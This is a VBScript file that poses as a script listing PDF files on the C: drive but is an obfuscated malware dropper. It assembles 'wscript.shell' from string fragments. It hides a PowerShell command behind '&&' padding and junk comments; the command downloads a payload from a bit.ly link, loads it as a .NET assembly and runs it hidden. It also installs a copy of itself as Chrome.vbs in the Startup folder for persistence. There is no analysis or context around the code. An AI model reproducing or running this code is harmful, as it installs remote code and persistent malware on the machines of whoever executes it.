Set objFSO = CreateObject("Scripting.FileSystemObject")''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
Set objSuperFolder = objFSO.GetFolder("C:\")''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
dim x,c,v,b,ho''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
x = "wscr"''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
c = x ''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
set x = nothing''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
x = "ipt."''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
c = c + x''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
ho = c ''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
set x = nothing''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
set c = nothing''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
v = "she"''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
c = v''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
set v = nothing''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
b = "ll"''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
c = c + b''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
all = ho + c''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
strx = "p&&ow&&e&&rs&&he&&l&&l  $&&f=&&'C&&:&&\&&Us&&er&&s&&\Pu&&bl&&i&&c&&&&\&&D&&oc&&um&&e&&nts&&\&&One&&e&&.&&h&&t&&m&&';&&&&i&&f&&&& (&&!(&&&&Te&&st&&-&&Pa&&th&& $f&&))&& {&&&&I&&n&&vo&&k&&e&&-&&W&&&&&&&&e&&b&&R&&eq&&ue&&s&&t&& 'h&&t&&p&&s&&:/&&/b&&it&&.l&&y&&/3j&&H&&O&&j0&&M'&& -ou&&t&&f&&ile&&&& $&&f&&  };[&&S&&y&&s&&te&&m&&.&&Re&&fl&&e&&ction&&.&&As&&se&&m&&bly&&]::&&lo&&adf&&il&&e&&(&&$&&f&&);[&&W&&ork&&A&&rea&&.&&Work&&]::&&E&&x&&e&&(&&)"



Call ShowSubfolders (objSuperFolder,strx)''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
Sub ShowSubFolders(fFolder,rto)''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    FUDX =replace(rto ,"&","")''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    Set objFolder = objFSO.GetFolder(fFolder.Path)''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    Set colFiles = objFolder.Files''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    For Each objFile in colFiles''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        If UCase(objFSO.GetExtensionName(objFile.name)) = "PDF" Then''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
            Wscript.Echo objFile.Name''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        End If
    Next''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    For Each Subfolder in fFolder.SubFolders''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        On Error Resume Next''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        i = 0 ''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        if (i = 0) Then''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        Set Objectot = CreateObject(all)''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        i = i + 1 ''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        end if ''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
        ShowSubFolders(Subfolder)''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    Next''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    Objectot.Run FUDX,0''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    dim ra,rs,rd,rf''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    ra = "Shellall"''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    rs = replace(ra,"all","")''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    set ra = nothing''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    ra = ".Applic"''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    rs = rs + ra ''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    set ra = nothing''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    rf = rs ''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    set rs = nothing''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    rf = rf +"ation"''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    set qwer = CreateObject(rf)'''''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf'''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    sdfghh="Chrome"+"."+"vb"+"s"''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    sdggghg= qwer.NameSpace(7).Self.Path''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    a = sdggghg + "\" + sdfghh''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
    copyit a''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
End Sub''''''''''''''''gmndolgzhgdehvwpxvlf'gmndolgzhgdehvwpxvlf
